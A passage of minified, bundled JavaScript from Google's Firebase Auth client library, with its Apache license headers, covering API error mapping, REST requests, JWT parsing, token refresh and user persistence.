 */function In(t,...e){throw Bd(t,...e)}function Xt(t,...e){return Bd(t,...e)}function X_(t,e,n){const r=Object.assign(Object.assign({},uC()),{[e]:n});return new To("auth","Firebase",r).create(e,{appName:t.name})}function xr(t){return X_(t,"operation-not-supported-in-this-environment","Operations that alter the current user are not supported in conjunction with FirebaseServerApp")}function Bd(t,...e){if(typeof t!="string"){const n=e[0],r=[...e.slice(1)];return r[0]&&(r[0].appName=t.name),t._errorFactory.create(n,...r)}return Y_.create(t,...e)}function Y(t,e,...n){if(!t)throw Bd(e,...n)}function fn(t){const e="INTERNAL ASSERTION FAILED: "+t;throw Va(e),new Error(e)}function Sn(t,e){t||fn(e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Eh(){var t;return typeof self<"u"&&((t=self.location)===null||t===void 0?void 0:t.href)||""}function hC(){return sg()==="http:"||sg()==="https:"}function sg(){var t;return typeof self<"u"&&((t=self.location)===null||t===void 0?void 0:t.protocol)||null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function dC(){return typeof navigator<"u"&&navigator&&"onLine"in navigator&&typeof navigator.onLine=="boolean"&&(hC()||zA()||"connection"in navigator)?navigator.onLine:!0}function fC(){if(typeof navigator>"u")return null;const t=navigator;return t.languages&&t.languages[0]||t.language||null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class So{constructor(e,n){this.shortDelay=e,this.longDelay=n,Sn(n>e,"Short delay should be less than long delay!"),this.isMobile=FA()||BA()}get(){return dC()?this.isMobile?this.longDelay:this.shortDelay:Math.min(5e3,this.shortDelay)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function $d(t,e){Sn(t.emulator,"Emulator should always be set here");const{url:n}=t.emulator;return e?`${n}${e.startsWith("/")?e.slice(1):e}`:n}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class J_{static initialize(e,n,r){this.fetchImpl=e,n&&(this.headersImpl=n),r&&(this.responseImpl=r)}static fetch(){if(this.fetchImpl)return this.fetchImpl;if(typeof self<"u"&&"fetch"in self)return self.fetch;if(typeof globalThis<"u"&&globalThis.fetch)return globalThis.fetch;if(typeof fetch<"u")return fetch;fn("Could not find fetch implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static headers(){if(this.headersImpl)return this.headersImpl;if(typeof self<"u"&&"Headers"in self)return self.Headers;if(typeof globalThis<"u"&&globalThis.Headers)return globalThis.Headers;if(typeof Headers<"u")return Headers;fn("Could not find Headers implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static response(){if(this.responseImpl)return this.responseImpl;if(typeof self<"u"&&"Response"in self)return self.Response;if(typeof globalThis<"u"&&globalThis.Response)return globalThis.Response;if(typeof Response<"u")return Response;fn("Could not find Response implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const pC={CREDENTIAL_MISMATCH:"custom-token-mismatch",MISSING_CUSTOM_TOKEN:"internal-error",INVALID_IDENTIFIER:"invalid-email",MISSING_CONTINUE_URI:"internal-error",INVALID_PASSWORD:"wrong-password",MISSING_PASSWORD:"missing-password",INVALID_LOGIN_CREDENTIALS:"invalid-credential",EMAIL_EXISTS:"email-already-in-use",PASSWORD_LOGIN_DISABLED:"operation-not-allowed",INVALID_IDP_RESPONSE:"invalid-credential",INVALID_PENDING_TOKEN:"invalid-credential",FEDERATED_USER_ID_ALREADY_LINKED:"credential-already-in-use",MISSING_REQ_TYPE:"internal-error",EMAIL_NOT_FOUND:"user-not-found",RESET_PASSWORD_EXCEED_LIMIT:"too-many-requests",EXPIRED_OOB_CODE:"expired-action-code",INVALID_OOB_CODE:"invalid-action-code",MISSING_OOB_CODE:"internal-error",CREDENTIAL_TOO_OLD_LOGIN_AGAIN:"requires-recent-login",INVALID_ID_TOKEN:"invalid-user-token",TOKEN_EXPIRED:"user-token-expired",USER_NOT_FOUND:"user-token-expired",TOO_MANY_ATTEMPTS_TRY_LATER:"too-many-requests",PASSWORD_DOES_NOT_MEET_REQUIREMENTS:"password-does-not-meet-requirements",INVALID_CODE:"invalid-verification-code",INVALID_SESSION_INFO:"invalid-verification-id",INVALID_TEMPORARY_PROOF:"invalid-credential",MISSING_SESSION_INFO:"missing-verification-id",SESSION_EXPIRED:"code-expired",MISSING_ANDROID_PACKAGE_NAME:"missing-android-pkg-name",UNAUTHORIZED_DOMAIN:"unauthorized-continue-uri",INVALID_OAUTH_CLIENT_ID:"invalid-oauth-client-id",ADMIN_ONLY_OPERATION:"admin-restricted-operation",INVALID_MFA_PENDING_CREDENTIAL:"invalid-multi-factor-session",MFA_ENROLLMENT_NOT_FOUND:"multi-factor-info-not-found",MISSING_MFA_ENROLLMENT_ID:"missing-multi-factor-info",MISSING_MFA_PENDING_CREDENTIAL:"missing-multi-factor-session",SECOND_FACTOR_EXISTS:"second-factor-already-in-use",SECOND_FACTOR_LIMIT_EXCEEDED:"maximum-second-factor-count-exceeded",BLOCKING_FUNCTION_ERROR_RESPONSE:"internal-error",RECAPTCHA_NOT_ENABLED:"recaptcha-not-enabled",MISSING_RECAPTCHA_TOKEN:"missing-recaptcha-token",INVALID_RECAPTCHA_TOKEN:"invalid-recaptcha-token",INVALID_RECAPTCHA_ACTION:"invalid-recaptcha-action",MISSING_CLIENT_TYPE:"missing-client-type",MISSING_RECAPTCHA_VERSION:"missing-recaptcha-version",INVALID_RECAPTCHA_VERSION:"invalid-recaptcha-version",INVALID_REQ_TYPE:"invalid-req-type"};/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const mC=new So(3e4,6e4);function Wd(t,e){return t.tenantId&&!e.tenantId?Object.assign(Object.assign({},e),{tenantId:t.tenantId}):e}async function Wi(t,e,n,r,i={}){return Z_(t,i,async()=>{let s={},o={};r&&(e==="GET"?o=r:s={body:JSON.stringify(r)});const l=Io(Object.assign({key:t.config.apiKey},o)).slice(1),u=await t._getAdditionalHeaders();u["Content-Type"]="application/json",t.languageCode&&(u["X-Firebase-Locale"]=t.languageCode);const h=Object.assign({method:e,headers:u},s);return jA()||(h.referrerPolicy="no-referrer"),J_.fetch()(e0(t,t.config.apiHost,n,l),h)})}async function Z_(t,e,n){t._canInitEmulator=!1;const r=Object.assign(Object.assign({},pC),e);try{const i=new yC(t),s=await Promise.race([n(),i.promise]);i.clearNetworkTimeout();const o=await s.json();if("needConfirmation"in o)throw ga(t,"account-exists-with-different-credential",o);if(s.ok&&!("errorMessage"in o))return o;{const l=s.ok?o.errorMessage:o.error.message,[u,h]=l.split(" : ");if(u==="FEDERATED_USER_ID_ALREADY_LINKED")throw ga(t,"credential-already-in-use",o);if(u==="EMAIL_EXISTS")throw ga(t,"email-already-in-use",o);if(u==="USER_DISABLED")throw ga(t,"user-disabled",o);const f=r[u]||u.toLowerCase().replace(/[_\s]+/g,"-");if(h)throw X_(t,f,h);In(t,f)}}catch(i){if(i instanceof xn)throw i;In(t,"network-request-failed",{message:String(i)})}}async function gC(t,e,n,r,i={}){const s=await Wi(t,e,n,r,i);return"mfaPendingCredential"in s&&In(t,"multi-factor-auth-required",{_serverResponse:s}),s}function e0(t,e,n,r){const i=`${e}${n}?${r}`;return t.config.emulator?$d(t.config,i):`${t.config.apiScheme}://${i}`}class yC{constructor(e){this.auth=e,this.timer=null,this.promise=new Promise((n,r)=>{this.timer=setTimeout(()=>r(Xt(this.auth,"network-request-failed")),mC.get())})}clearNetworkTimeout(){clearTimeout(this.timer)}}function ga(t,e,n){const r={appName:t.name};n.email&&(r.email=n.email),n.phoneNumber&&(r.phoneNumber=n.phoneNumber);const i=Xt(t,e,r);return i.customData._tokenResponse=n,i}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function vC(t,e){return Wi(t,"POST","/v1/accounts:delete",e)}async function t0(t,e){return Wi(t,"POST","/v1/accounts:lookup",e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ls(t){if(t)try{const e=new Date(Number(t));if(!isNaN(e.getTime()))return e.toUTCString()}catch{}}async function _C(t,e=!1){const n=at(t),r=await n.getIdToken(e),i=qd(r);Y(i&&i.exp&&i.auth_time&&i.iat,n.auth,"internal-error");const s=typeof i.firebase=="object"?i.firebase:void 0,o=s==null?void 0:s.sign_in_provider;return{claims:i,token:r,authTime:Ls(pc(i.auth_time)),issuedAtTime:Ls(pc(i.iat)),expirationTime:Ls(pc(i.exp)),signInProvider:o||null,signInSecondFactor:(s==null?void 0:s.sign_in_second_factor)||null}}function pc(t){return Number(t)*1e3}function qd(t){const[e,n,r]=t.split(".");if(e===void 0||n===void 0||r===void 0)return Va("JWT malformed, contained fewer than 3 sections"),null;try{const i=U_(n);return i?JSON.parse(i):(Va("Failed to decode base64 JWT payload"),null)}catch(i){return Va("Caught error parsing JWT payload as JSON",i==null?void 0:i.toString()),null}}function og(t){const e=qd(t);return Y(e,"internal-error"),Y(typeof e.exp<"u","internal-error"),Y(typeof e.iat<"u","internal-error"),Number(e.exp)-Number(e.iat)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function ao(t,e,n=!1){if(n)return e;try{return await e}catch(r){throw r instanceof xn&&wC(r)&&t.auth.currentUser===t&&await t.auth.signOut(),r}}function wC({code:t}){return t==="auth/user-disabled"||t==="auth/user-token-expired"}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class EC{constructor(e){this.user=e,this.isRunning=!1,this.timerId=null,this.errorBackoff=3e4}_start(){this.isRunning||(this.isRunning=!0,this.schedule())}_stop(){this.isRunning&&(this.isRunning=!1,this.timerId!==null&&clearTimeout(this.timerId))}getInterval(e){var n;if(e){const r=this.errorBackoff;return this.errorBackoff=Math.min(this.errorBackoff*2,96e4),r}else{this.errorBackoff=3e4;const i=((n=this.user.stsTokenManager.expirationTime)!==null&&n!==void 0?n:0)-Date.now()-3e5;return Math.max(0,i)}}schedule(e=!1){if(!this.isRunning)return;const n=this.getInterval(e);this.timerId=setTimeout(async()=>{await this.iteration()},n)}async iteration(){try{await this.user.getIdToken(!0)}catch(e){(e==null?void 0:e.code)==="auth/network-request-failed"&&this.schedule(!0);return}this.schedule()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Th{constructor(e,n){this.createdAt=e,this.lastLoginAt=n,this._initializeTime()}_initializeTime(){this.lastSignInTime=Ls(this.lastLoginAt),this.creationTime=Ls(this.createdAt)}_copy(e){this.createdAt=e.createdAt,this.lastLoginAt=e.lastLoginAt,this._initializeTime()}toJSON(){return{createdAt:this.createdAt,lastLoginAt:this.lastLoginAt}}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function yl(t){var e;const n=t.auth,r=await t.getIdToken(),i=await ao(t,t0(n,{idToken:r}));Y(i==null?void 0:i.users.length,n,"internal-error");const s=i.users[0];t._notifyReloadListener(s);const o=!((e=s.providerUserInfo)===null||e===void 0)&&e.length?n0(s.providerUserInfo):[],l=IC(t.providerData,o),u=t.isAnonymous,h=!(t.email&&s.passwordHash)&&!(l!=null&&l.length),f=u?h:!1,p={uid:s.localId,displayName:s.displayName||null,photoURL:s.photoUrl||null,email:s.email||null,emailVerified:s.emailVerified||!1,phoneNumber:s.phoneNumber||null,tenantId:s.tenantId||null,providerData:l,metadata:new Th(s.createdAt,s.lastLoginAt),isAnonymous:f};Object.assign(t,p)}async function TC(t){const e=at(t);await yl(e),await e.auth._persistUserIfCurrent(e),e.auth._notifyListenersIfCurrent(e)}function IC(t,e){return[...t.filter(r=>!e.some(i=>i.providerId===r.providerId)),...e]}function n0(t){return t.map(e=>{var{providerId:n}=e,r=zd(e,["providerId"]);return{providerId:n,uid:r.rawId||"",displayName:r.displayName||null,email:r.email||null,phoneNumber:r.phoneNumber||null,photoURL:r.photoUrl||null}})}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function SC(t,e){const n=await Z_(t,{},async()=>{const r=Io({grant_type:"refresh_token",refresh_token:e}).slice(1),{tokenApiHost:i,apiKey:s}=t.config,o=e0(t,i,"/v1/token",`key=${s}`),l=await t._getAdditionalHeaders();return l["Content-Type"]="application/x-www-form-urlencoded",J_.fetch()(o,{method:"POST",headers:l,body:r})});return{accessToken:n.access_token,expiresIn:n.expires_in,refreshToken:n.refresh_token}}async function AC(t,e){return Wi(t,"POST","/v2/accounts:revokeToken",Wd(t,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class _i{constructor(){this.refreshToken=null,this.accessToken=null,this.expirationTime=null}get isExpired(){return!this.expirationTime||Date.now()>this.expirationTime-3e4}updateFromServerResponse(e){Y(e.idToken,"internal-error"),Y(typeof e.idToken<"u","internal-error"),Y(typeof e.refreshToken<"u","internal-error");const n="expiresIn"in e&&typeof e.expiresIn<"u"?Number(e.expiresIn):og(e.idToken);this.updateTokensAndExpiration(e.idToken,e.refreshToken,n)}updateFromIdToken(e){Y(e.length!==0,"internal-error");const n=og(e);this.updateTokensAndExpiration(e,null,n)}async getToken(e,n=!1){return!n&&this.accessToken&&!this.isExpired?this.accessToken:(Y(this.refreshToken,e,"user-token-expired"),this.refreshToken?(await this.refresh(e,this.refreshToken),this.accessToken):null)}clearRefreshToken(){this.refreshToken=null}async refresh(e,n){const{accessToken:r,refreshToken:i,expiresIn:s}=await SC(e,n);this.updateTokensAndExpiration(r,i,Number(s))}updateTokensAndExpiration(e,n,r){this.refreshToken=n||null,this.accessToken=e||null,this.expirationTime=Date.now()+r*1e3}static fromJSON(e,n){const{refreshToken:r,accessToken:i,expirationTime:s}=n,o=new _i;return r&&(Y(typeof r=="string","internal-error",{appName:e}),o.refreshToken=r),i&&(Y(typeof i=="string","internal-error",{appName:e}),o.accessToken=i),s&&(Y(typeof s=="number","internal-error",{appName:e}),o.expirationTime=s),o}toJSON(){return{refreshToken:this.refreshToken,accessToken:this.accessToken,expirationTime:this.expirationTime}}_assign(e){this.accessToken=e.accessToken,this.refreshToken=e.refreshToken,this.expirationTime=e.expirationTime}_clone(){return Object.assign(new _i,this.toJSON())}_performRefresh(){return fn("not implemented")}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function bn(t,e){Y(typeof t=="string"||typeof t>"u","internal-error",{appName:e})}class pn{constructor(e){var{uid:n,auth:r,stsTokenManager:i}=e,s=zd(e,["uid","auth","stsTokenManager"]);this.providerId="firebase",this.proactiveRefresh=new EC(this),this.reloadUserInfo=null,this.reloadListener=null,this.uid=n,this.auth=r,this.stsTokenManager=i,this.accessToken=i.accessToken,this.displayName=s.displayName||null,this.email=s.email||null,this.emailVerified=s.emailVerified||!1,this.phoneNumber=s.phoneNumber||null,this.photoURL=s.photoURL||null,this.isAnonymous=s.isAnonymous||!1,this.tenantId=s.tenantId||null,this.providerData=s.providerData?[...s.providerData]:[],this.metadata=new Th(s.createdAt||void 0,s.lastLoginAt||void 0)}async getIdToken(e){const n=await ao(this,this.stsTokenManager.getToken(this.auth,e));return Y(n,this.auth,"internal-error"),this.accessToken!==n&&(this.accessToken=n,await this.auth._persistUserIfCurrent(this),this.auth._notifyListenersIfCurrent(this)),n}getIdTokenResult(e){return _C(this,e)}reload(){return TC(this)}_assign(e){this!==e&&(Y(this.uid===e.uid,this.auth,"internal-error"),this.displayName=e.displayName,this.photoURL=e.photoURL,this.email=e.email,this.emailVerified=e.emailVerified,this.phoneNumber=e.phoneNumber,this.isAnonymous=e.isAnonymous,this.tenantId=e.tenantId,this.providerData=e.providerData.map(n=>Object.assign({},n)),this.metadata._copy(e.metadata),this.stsTokenManager._assign(e.stsTokenManager))}_clone(e){const n=new pn(Object.assign(Object.assign({},this),{auth:e,stsTokenManager:this.stsTokenManager._clone()}));return n.metadata._copy(this.metadata),n}_onReload(e){Y(!this.reloadListener,this.auth,"internal-error"),this.reloadListener=e,this.reloadUserInfo&&(this._notifyReloadListener(this.reloadUserInfo),this.reloadUserInfo=null)}_notifyReloadListener(e){this.reloadListener?this.reloadListener(e):this.reloadUserInfo=e}_startProactiveRefresh(){this.proactiveRefresh._start()}_stopProactiveRefresh(){this.proactiveRefresh._stop()}async _updateTokensIfNecessary(e,n=!1){let r=!1;e.idToken&&e.idToken!==this.stsTokenManager.accessToken&&(this.stsTokenManager.updateFromServerResponse(e),r=!0),n&&await yl(this),await this.auth._persistUserIfCurrent(this),r&&this.auth._notifyListenersIfCurrent(this)}async delete(){if(qn(this.auth.app))return Promise.reject(xr(this.auth));const e=await this.getIdToken();return await ao(this,vC(this.auth,{idToken:e})),this.stsTokenManager.clearRefreshToken(),this.auth.signOut()}toJSON(){return Object.assign(Object.assign({uid:this.uid,email:this.email||void 0,emailVerified:this.emailVerified,displayName:this.displayName||void 0,isAnonymous:this.isAnonymous,photoURL:this.photoURL||void 0,phoneNumber:this.phoneNumber||void 0,tenantId:this.tenantId||void 0,providerData:this.providerData.map(e=>Object.assign({},e)),stsTokenManager:this.stsTokenManager.toJSON(),_redirectEventId:this._redirectEventId},this.metadata.toJSON()),{apiKey:this.auth.config.apiKey,appName:this.auth.name})}get refreshToken(){return this.stsTokenManager.refreshToken||""}static _fromJSON(e,n){var r,i,s,o,l,u,h,f;const p=(r=n.displayName)!==null&&r!==void 0?r:void 0,g=(i=n.email)!==null&&i!==void 0?i:void 0,v=(s=n.phoneNumber)!==null&&s!==void 0?s:void 0,A=(o=n.photoURL)!==null&&o!==void 0?o:void 0,k=(l=n.tenantId)!==null&&l!==void 0?l:void 0,N=(u=n._redirectEventId)!==null&&u!==void 0?u:void 0,S=(h=n.createdAt)!==null&&h!==void 0?h:void 0,_=(f=n.lastLoginAt)!==null&&f!==void 0?f:void 0,{uid:R,emailVerified:V,isAnonymous:U,providerData:j,stsTokenManager:I}=n;Y(R&&I,e,"internal-error");const y=_i.fromJSON(this.name,I);Y(typeof R=="string",e,"internal-error"),bn(p,e.name),bn(g,e.name),Y(typeof V=="boolean",e,"internal-error"),Y(typeof U=="boolean",e,"internal-error"),bn(v,e.name),bn(A,e.name),bn(k,e.name),bn(N,e.name),bn(S,e.name),bn(_,e.name);const T=new pn({uid:R,auth:e,email:g,emailVerified:V,displayName:p,isAnonymous:U,photoURL:A,phoneNumber:v,tenantId:k,stsTokenManager:y,createdAt:S,lastLoginAt:_});return j&&Array.isArray(j)&&(T.providerData=j.map(C=>Object.assign({},C))),N&&(T._redirectEventId=N),T}static async _fromIdTokenResponse(e,n,r=!1){const i=new _i;i.updateFromServerResponse(n);const s=new pn({uid:n.localId,auth:e,stsTokenManager:i,isAnonymous:r});return await yl(s),s}static async _fromGetAccountInfoResponse(e,n,r){const i=n.users[0];Y(i.localId!==void 0,"internal-error");const s=i.providerUserInfo!==void 0?n0(i.providerUserInfo):[],o=!(i.email&&i.passwordHash)&&!(s!=null&&s.length),l=new _i;l.updateFromIdToken(r);const u=new pn({uid:i.localId,auth:e,stsTokenManager:l,isAnonymous:o}),h={uid:i.localId,displayName:i.displayName||null,photoURL:i.photoUrl||null,email:i.email||null,emailVerified:i.emailVerified||!1,phoneNumber:i.phoneNumber||null,tenantId:i.tenantId||null,providerData:s,metadata:new Th(i.createdAt,i.lastLoginAt),isAnonymous:!(i.email&&i.passwordHash)&&!(s!=null&&s.length)};return Object.assign(u,h),u}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ag=new Map;function mn(t){Sn(t instanceof Function,"Expected a class definition");let e=ag.get(t);return e?(Sn(e instanceof t,"Instance stored in cache mismatched with class"),e):(e=new t,ag.set(t,e),e)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class r0{constructor(){this.type="NONE",this.storage={}}async _isAvailable(){return!0}async _set(e,n){this.storage[e]=n}async _get(e){const n=this.storage[e];return n===void 0?null:n}async _remove(e){delete this.storage[e]}_addListener(e,n){}_removeListener(e,n){}}r0.type="NONE";const lg=r0;/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Oa(t,e,n){return`firebase:${t}:${e}:${n}`}class wi{constructor(e,n,r){this.persistence=e,this.auth=n,this.userKey=r;const{config:i,name:s}=this.auth;this.fullUserKey=Oa(this.userKey,i.apiKey,s),this.fullPersistenceKey=Oa("persistence",i.apiKey,s),this.boundEventHandler=n._onStorageEvent.bind(n),this.persistence._addListener(this.fullUserKey,this.boundEventHandler)}setCurrentUser(e){return this.persistence._set(this.fullUserKey,e.toJSON())}async getCurrentUser(){const e=await this.persistence._get(this.fullUserKey);return e?pn._fromJSON(this.auth,e):null}removeCurrentUser(){return this.persistence._remove(this.fullUserKey)}savePersistenceForRedirect(){return this.persistence._set(this.fullPersistenceKey,this.persistence.type)}async setPersistence(e){if(this.persistence===e)return;const n=await this.getCurrentUser();if(await this.removeCurrentUser(),this.persistence=e,n)return this.setCurrentUser(n)}delete(){this.persistence._removeListener(this.fullUserKey,this.boundEventHandler)}static async create(e,n,r="authUser"){if(!n.length)return new wi(mn(lg),e,r);const i=(await Promise.all(n.map(async h=>{if(await h._isAvailable())return h}))).filter(h=>h);let s=i[0]||mn(lg);const o=Oa(r,e.config.apiKey,e.name);let l=null;for(const h of n)try{const f=await h._get(o);if(f){const p=pn._fromJSON(e,f);h!==s&&(l=p),s=h;break}}catch{}const u=i.filter(h=>h._shouldAllowMigration);return!s._shouldAllowMigration||!u.length?new wi(s,e,r):(s=u[0],l&&await s._set(o,l.toJSON()),await Promise.all(n.map(async h=>{if(h!==s)try{await h._remove(o)}catch{}})),new wi(s,e,r))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
